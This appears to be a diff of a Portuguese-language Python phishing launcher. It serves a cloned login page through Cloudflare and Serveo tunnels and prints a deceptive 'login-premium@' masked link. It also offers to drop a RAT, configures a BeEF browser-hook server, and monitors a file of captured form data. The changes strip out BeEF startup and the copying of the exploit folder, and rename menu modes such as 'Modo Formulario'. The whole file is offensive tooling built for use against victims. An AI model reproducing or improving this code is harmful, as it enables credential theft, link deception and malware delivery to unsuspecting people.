@@ -49,8 +49,19 @@ def clear_screen():
 
 def setup():
     try:
+        # Cria os diretórios, se não existirem
         os.makedirs(CONFIG.APACHE_DIR, exist_ok=True)
         os.makedirs(CONFIG.EXPLOIT_DIR, exist_ok=True)
+        
+        # Limpa o diretório exploits antes de adicionar novos arquivos
+        if os.path.exists(CONFIG.EXPLOIT_DIR):
+            for filename in os.listdir(CONFIG.EXPLOIT_DIR):
+                file_path = os.path.join(CONFIG.EXPLOIT_DIR, filename)
+                if os.path.isfile(file_path):
+                    os.unlink(file_path)
+                elif os.path.isdir(file_path):
+                    shutil.rmtree(file_path)
+            logger.info(f"{YELLOW}[+] Diretório {CONFIG.EXPLOIT_DIR} limpo.{NC}")
         
         # Pergunta se quer adicionar um rat
         add_rat = input(f"{YELLOW}[+] Quer adicionar um rat? (s/n): {NC}").strip().lower()
@@ -63,17 +74,6 @@ def setup():
                 logger.info(f"{RED}[!] Arquivo {rat_path} não encontrado! Continuando sem copiar o rat.{NC}")
         else:
             logger.info(f"{YELLOW}[+] Nenhum rat adicionado, continuando...{NC}")
-        
-        # Copia a pasta exploits inteira, se existir
-        if os.path.exists(CONFIG.EXPLOIT_SOURCE_DIR):
-            shutil.copytree(
-                CONFIG.EXPLOIT_SOURCE_DIR,
-                CONFIG.EXPLOIT_DIR,
-                dirs_exist_ok=True
-            )
-            logger.info(f"{GREEN}[+] Pasta 'exploits' copiada para {CONFIG.EXPLOIT_DIR}{NC}")
-        else:
-            logger.info(f"{YELLOW}[!] Pasta 'exploits' não encontrada em {CONFIG.EXPLOIT_SOURCE_DIR}{NC}")
         
         os.chmod(CONFIG.APACHE_DIR, 0o755)
         os.chmod(CONFIG.EXPLOIT_DIR, 0o755)
@@ -96,13 +96,11 @@ def managed_process(*args, **kwargs):
 
 def get_cloudflared_link():
     try:
-        # 
         process = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:8080"],
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE,
                                  text=True)
         
-        # Padrão regex para identificar o link correto
         url_pattern = re.compile(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com')
         
         for _ in range(20):  # Timeout de 20 segundos
@@ -139,14 +137,6 @@ def get_serveo_link():
         logger.info(f"{YELLOW}[!] Falha ao iniciar Serveo.net{NC}")
         return None, None
 
-def start_beef():
-    process = subprocess.Popen(["./beef"],
-                              cwd=CONFIG.BEEF_DIR,
-                              stdout=subprocess.DEVNULL,
-                              stderr=subprocess.DEVNULL)
-    time.sleep(5)
-    return process
-
 def update_beef_config(serveo_url):
     with open(CONFIG_FILE, 'r') as f:
         config = f.read()
@@ -156,19 +146,15 @@ def update_beef_config(serveo_url):
     in_public_block = False
     
     for i, line in enumerate(config_lines):
-        if '#public:' in line:
-            config_lines[i] = 'public:'
+        if 'public:' in line:
+            config_lines[i] = '        public:'
             in_public_block = True
         elif in_public_block and line.strip() and not line.startswith(' '):
             in_public_block = False
         
         if in_public_block:
-            if '#    host:' in line:
-                config_lines[i] = f'    host: "{host}"'
-            elif '#    port:' in line:
-                config_lines[i] = '    port: 443'
-            elif '#    https:' in line:
-                config_lines[i] = '    https: true'
+            if 'host:' in line:
+                config_lines[i] = f'            host: "{host}" # public hostname/IP address'
     
     config = '\n'.join(config_lines)
     with open(CONFIG_FILE, 'w') as f:
@@ -197,9 +183,7 @@ def start_attack(egs_type, model):
     
     serveo_link, serveo_proc = get_serveo_link()
     if not serveo_link:
-        return None, None, None, None
-    
-    beef_proc = start_beef()
+        return None, None, None
     
     if egs_type == "1":
         subprocess.run(["cp", f"{CONFIG.EGS_DIR}/index.php", CONFIG.APACHE_DIR], check=True)
@@ -219,8 +203,8 @@ def start_attack(egs_type, model):
 
     cf_link, cf_proc = get_cloudflared_link()
     if not cf_link:
-        cleanup_processes([php_proc, beef_proc, serveo_proc])
-        return None, None, None, None
+        cleanup_processes([php_proc, serveo_proc])
+        return None, None, None
 
     box_width = 100
     clear_screen()
@@ -235,20 +219,20 @@ def start_attack(egs_type, model):
             formatted.append(f"{YELLOW}| {'':<20} {line:<{max_width}}  |{NC}")
         return formatted
 
-    for line in format_link("LINK GERADO:.......", cf_link):
+    for line in format_link("LINK GERADO:.........", cf_link):
         logger.info(line)
-    for line in format_link("MASCARADO:..........", f"https://login-premium@{cf_link.split('://')[1]}"):
+    for line in format_link("MASCARADO:...........", f"https://login-premium@{cf_link.split('://')[1]}"):
         logger.info(line)
-    for line in format_link("BeEF LINK (Serveo):", serveo_link):
+    for line in format_link("Serveo Link Beef:....", serveo_link):
         logger.info(line)
-    for line in format_link("BeEF Painel d Cntrl:", "http://127.0.0.1/ui/panel"):
+    for line in format_link("Beef se inciado:.....", f"http://127.0.0.1"):
         logger.info(line)
 
     logger.info(f"{YELLOW}+{'-'*box_width}+{NC}")
 
     threading.Thread(target=monitor_data, args=(DATA_FILE,), daemon=True).start()
     
-    return php_proc, cf_proc, serveo_proc, beef_proc
+    return php_proc, cf_proc, serveo_proc
 
 def monitor_data(file):
     time.sleep(2)
@@ -286,17 +270,14 @@ def main():
     if not shutil.which("cloudflared") or not shutil.which("php") or not shutil.which("ssh"):
         logger.info(f"{RED}[!] Dependências faltando (cloudflared, php ou ssh). Instale primeiro.{NC}")
         sys.exit(1)
-    if not os.path.exists(f"{CONFIG.BEEF_DIR}/beef"):
-        logger.info(f"{RED}[!] Arquivo beef não encontrado em {CONFIG.BEEF_DIR}{NC}")
-        sys.exit(1)
 
     setup()
 
     while True:
         show_menu("MENU PRINCIPAL", 
         {
-            "1": "Modo Standard",
-            "2": "Captura de Cookies (Beta)",
+            "1": "Modo Formulario",
+            "2": "Instagram seguir (em desenvolvimento)",
             "0": "Sair"
         })
         choice = get_valid_input(f"{YELLOW}[+] Escolha: {NC}", ["0", "1", "2"])
@@ -312,15 +293,21 @@ def main():
             
         processes = []
         try:
-            php_proc, cf_proc, serveo_proc, beef_proc = start_attack(choice, model)
+            php_proc, cf_proc, serveo_proc = start_attack(choice, model)
             if not php_proc:
+                logger.info(f"{RED}[!] Falha ao iniciar o ataque. Verifique as dependências e tente novamente.{NC}")
                 continue
-            processes = [php_proc, cf_proc, serveo_proc, beef_proc]
-            sys.stdout.write(f"{YELLOW}\nPressione Ctrl + C para parar os serviços (Apache permanece ativo)...{NC}\n")
+            processes = [php_proc, cf_proc, serveo_proc]
+            sys.stdout.write(f"{YELLOW}\nPressione Ctrl + C para parar os serviços...{NC}\n")
             sys.stdout.flush()
-            input()
+            while True:  # Loop infinito até Ctrl+C ser pressionado
+                time.sleep(1)  # Mantém o programa rodando
         except KeyboardInterrupt:
-            logger.info(f"{YELLOW}[+] Finalizando serviços (mantendo Apache ativo)...{NC}")
+            logger.info(f"{YELLOW}[+] Finalizando serviços...{NC}")
+            cleanup_processes([proc for proc in processes if proc is not None])
+            logger.info(f"{GREEN}[+] Serviços finalizados com sucesso.{NC}")
+        except Exception as e:
+            logger.error(f"{RED}[!] Erro inesperado: {str(e)}{NC}")
             cleanup_processes([proc for proc in processes if proc is not None])
         finally:
             cleanup_processes([proc for proc in processes if proc is not None])
